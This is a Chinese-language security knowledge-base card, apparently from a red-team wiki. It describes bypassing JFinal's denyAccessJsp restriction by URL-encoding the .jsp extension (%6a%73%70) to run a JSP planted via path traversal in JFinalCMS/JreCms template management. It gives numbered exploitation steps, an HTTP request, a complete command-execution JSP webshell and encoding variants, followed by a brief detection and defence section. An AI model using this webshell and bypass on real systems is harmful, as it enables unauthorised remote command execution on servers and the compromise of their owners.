---
id: web-java-framework-jfinal-denyaccessjsp-url-encoding-bypass
title: JFinal denyAccessJsp 拦截 .jsp 直接访问：URL 编码扩展名 %6a%73%70 绕过并执行已写入 JSP
type: scenario
domain: web
path: web/java/framework
technique: jfinal-denyaccessjsp-url-encoding-bypass
tags:
- java
- jfinal
- access-control
- url-encoding
- jsp
- webshell
- filter-bypass
cve: []
severity: high
confidence: high
status: verified
created: '2026-11-12'
updated: '2026-11-12'
verification:
  verified_by: verifier-V607
  verified_at: '2026-11-12T18:44:47+08:00'
  notes: 已对照原文 0x06 与图22-26 核对：TemplateController.save 以 directory 逗号转斜杠+fileName 原样拼接写 templates 下文件（图23 调试 filePath=/default/../../shell.jsp），图24 target 目录出现 shell.jsp，图25 Constants.denyAccessJsp=true 默认拒绝直接访问 jsp，图26 GET /shell.%6a%73%70?cmd=whoami 返回 nt authority\administrator，确证 URL 编码扩展名绕过与命令执行；JSP 内容与卡片 PoC 一致。affected_versions 原文未声明。未在本机复跑。
url: /docs/web/java/framework/web-java-framework-jfinal-denyaccessjsp-url-encoding-bypass/
draft: false
kb_aliases:
- JFinal denyAccessJsp 绕过
- jsp 扩展名 URL 编码
- '%6a%73%70 绕过'
- JFinal 直接访问 jsp
- JreCms 模板写入 GetShell
---

## 一句话结论

JFinal 的 `Constants.denyAccessJsp = true` 默认按扩展名拒绝直接访问 `.jsp` 文件，但 Tomcat 等容器在映射前会对 URL 路径做 URL 解码；把扩展名写成 `%6a%73%70`（即 `jsp`），JFinal 的字符串判断只看到编码串而放行，容器解码后仍把请求交给 JSP 引擎，从而执行此前通过模板写入/文件上传落地的 `shell.jsp`。

## 原理

- **JFinal 的默认策略**：JFinal 配置项 `denyAccessJsp` 默认为 `true`，其路由/静态资源处理会在 URL 扩展名为 `.jsp` 时直接拒绝，防止用户上传/写入的 JSP 被直接访问执行。
- **判断与解码的顺序差**：JFinal 在应用层对 **原始请求 URI** 做扩展名判断；Tomcat 在进入 Servlet/JSP 映射前会按规范对路径进行 URL 解码。请求 `/shell.%6a%73%70` 在 JFinal 看来扩展名是 `%6a%73%70`（不等于 `jsp`，放行），Tomcat 解码后得到 `/shell.jsp` 并交给 JSP Servlet 编译执行。
- **前置条件**：攻击者需要先让 Web 根目录下存在一个内容可控的 `.jsp` 文件。JFinalCMS/JreCms 的后台模板新增/编辑功能存在路径穿越写入（`TemplateController.save/update` 配合 `directory`/`fileName` 穿越到 `../../shell.jsp`），或存在任意文件上传/写入点；写入后通过编码路径访问即可执行。
- **为什么成立**：访问控制检查与容器路径规范化/解码不一致，是典型的“过滤器看到的路径 ≠ 实际执行的路径”问题；只在应用层做扩展名字符串比较，无法覆盖容器的解码行为。
- **验证要点**：确认 `denyAccessJsp=true` 时 `/shell.jsp` 被拒，而 `/shell.%6a%73%70` 返回 200 且命令执行；确认容器会解码路径（Tomcat 默认会）。

## 触发条件

- 目标使用 JFinal（`denyAccessJsp` 默认 true）并部署在会解码 URL 路径的容器（如 Tomcat）。
- Web 根目录/可访问目录下已写入内容可控的 `.jsp`（通过模板穿越写入、文件上传、备份恢复等）。
- 应用未额外在 WAF/网关层拦截编码后的 jsp 扩展名。
- 目标 JSP 引擎可编译执行该文件（权限、扩展名映射正常）。

## 利用步骤

1. 确认 JFinalCMS/JreCms 后台模板管理可用，利用 `TemplateController.save`/`update` 的目录穿越把 JSP 代码写到 Web 根目录（如 `fileName=../../shell.jsp`）。
2. 直接访问 `/shell.jsp`，确认被 `denyAccessJsp` 拒绝（403/404）。
3. 将扩展名做 URL 编码：访问 `/shell.%6a%73%70?cmd=whoami`。
4. 容器解码后执行 JSP，返回命令输出；若被拦，尝试双重编码 `%256a...`、大小写/分号等变体。
5. 验证：编码路径返回 200 且命令执行；未成功时检查容器解码规则、WAF 规则、文件是否真的落在 Web 根。

## PoC

```http
GET /shell.%6a%73%70?cmd=whoami HTTP/1.1
Host: target:8080
```

```jsp
<%@ page import="java.io.*" %>
<%
  Process p = Runtime.getRuntime().exec(request.getParameter("cmd"));
  BufferedReader br = new BufferedReader(new InputStreamReader(p.getInputStream()));
  String line;
  while ((line = br.readLine()) != null) response.getWriter().print(line + "\n");
%>
```

## 变体与关联

- [[web-generic-file-inclusion-jfinalcms-template-controller-traversal-read-write-delete]]：JFinalCMS 后台模板 `save/update` 的目录穿越写文件，是本卡落地 `.jsp` 的前置原语。
- [[web-generic-file-inclusion-jfinalcms-ajax-html-render-traversal]]：同产品另一种“任意模板渲染”路径。
- [[web-generic-file-upload-crm-sendfile-jsp-preserve-suffix]]、[[web-generic-file-upload-goldlib-opac-original-extension-upload]]：其它扩展名/后缀绕过思路，可对照容器解码与过滤顺序。
- 变体：双重 URL 编码、`;` 路径参数、大小写 `.JSP`、末尾点/空格等容器差异；也可用在其它基于扩展名的访问控制。
- 边界：容器不解码路径、JFinal 升级为解码后再判断、网关拦截编码串、JSP 文件不可写时链断。

## 检测与防御

- 检测：URL 中出现 `%6a%73%70`、`%256a` 等编码后的 jsp 扩展名；Web 根目录出现非预期 `.jsp`；JSP 执行异常日志。
- 防御：不要仅依赖 `denyAccessJsp`，在容器/网关层对解码后的路径做扩展名与目录白名单校验；模板/上传目录禁止脚本执行（Tomcat 关闭该目录的 JSP 映射）；修复模板管理路径穿越与任意文件写入；WAF 拦截编码路径。
- 响应：排查 Web 根目录新增 JSP 与执行记录，确认是否已 GetShell。
